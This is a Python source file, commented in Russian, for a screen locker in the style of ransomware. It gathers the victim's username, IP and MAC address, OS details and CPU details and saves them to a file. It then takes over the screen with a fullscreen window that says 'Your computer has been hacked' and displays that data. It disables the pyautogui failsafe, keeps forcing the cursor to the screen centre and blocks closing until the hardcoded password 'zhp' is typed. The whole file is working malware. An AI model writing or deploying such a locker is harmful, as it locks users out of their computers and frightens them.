import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import getpass
import os
import socket
from uuid import getnode as get_mac
import platform
import pyspeedtest
import psutil
from datetime import datetime

def callback(event):
    global k, entry
    if entry.get() == "zhp":  # задаём ключ
        k = True

def on_closing():
    click(width/2, height/2)  # закликивание в центр экрана
    moveTo(width/2, height/2)  # перемещение курсора в центр экрана
    root.attributes("-fullscreen", True)  # включаем полноэкранный режим
    root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
    root.update()  # постоянное обновление окна
    root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу

#-----общая информация о системе - сбор
name=getpass.getuser()
ip=socket.gethostbyname(socket.getfqdn())
mac=hex(get_mac())
ost=platform.uname()

#--cкорость интернет-соединения
inet=pyspeedtest.SpeedTest('google.com')
download=inet.download()

#--часовой пояс,время,cpu
zone=psutil.boot_time()
time=datetime.fromtimestamp(zone)
cpu=psutil.cpu_freq()

#--сохранение в файл
file=open("info_comp.txt","w")
file.write(f"[=================================]\n Operating System:{ost.system} {ost.version}\n Processor:{ost.processor}\n Username:{name}\n"
           f" IP adress:{ip}\n MAC adress:{mac}\n Timezone:{time.year}/{time.month}/{time.day} "
           f"{time.hour}:{time.minute}:{time.second}\n Download:{download} MBs\n CPU:{cpu.current:.2f} MHz\n"
           f"[=================================]\n")
file.close()

#непосредственное создание локера
root = Tk()
pyautogui.FAILSAFE = False  # выключаем защиту "левого верхнего угла"
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('From "Xakep" with love')  # пишем как программа отобразиться в панели задач
root.attributes("-fullscreen", True)  # включаем полноэкранный режим
entry = Entry(root, font=1)  # создаём окошко ввода
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)  # размеры окошка и его положение
label0=Label(root,text=f"Ваш компьютер взломан, ниже представлена часть собранной информации\n\n Operating System:{ost.system} {ost.version}\n Processor:{ost.processor}\n Username:{name}\n"
           f" IP adress:{ip}\n MAC adress:{mac}\n Timezone:{time.year}/{time.month}/{time.day} "
           f"{time.hour}:{time.minute}:{time.second}\n Download:{download} MBs\n CPU:{cpu.current:.2f} MHz\n")
#label0.grid(row=0,column=0)
label0.place(x=width/3,y=height/8)
label1 = Label(root, text="Пиши пароль и жми Ctrl+C", font='Arial 20')  # сообщение пользователю
label1.place(x=width/2-75-130, y=height/2-25-100)  # положение сообщения
root.update()  # постоянное обновление окна
sleep(3)  # пауза в обновлении
click(width/2, height/2)

k = False  # обнуление ключа
while not k:
    on_closing()  # вызываем функцию баннер